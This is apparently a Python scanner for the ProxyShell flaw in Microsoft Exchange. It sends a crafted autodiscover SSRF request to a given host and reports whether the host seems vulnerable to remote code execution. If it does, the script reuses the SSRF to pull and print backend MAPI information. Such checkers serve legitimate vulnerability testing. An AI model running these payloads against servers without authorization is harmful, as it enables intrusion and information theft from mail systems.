import requests
import argparse
from bs4 import BeautifulSoup
import re
###Usage:
### python3 check-proxyshell.py --url mail.localhost.local

s = requests.session()
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Target URL: mail.target.com")
args = parser.parse_args()
target = args.url


def check(target):
    r = s.get(
        "https://" + target + "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com")

    if r.status_code == 302 or r.status_code == 500:
        print("\nTarget seems vulnerable for Remote code execution!\n")
        print("Let's see if we can get more info \n--------------------------------------\n")
        rr = s.get(
            "https://" + target + "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com")
        soup = BeautifulSoup(rr.text, 'html.parser')
        text = re.sub(' +', ' ', str(soup.prettify()).replace("\n", " "))
        soup2 = BeautifulSoup(text, "html.parser")
        for pa in soup2.find_all('p'):
            print(pa.get_text().strip("\n"))
        print("\n")
    else:
        print(r.text)


check(target)
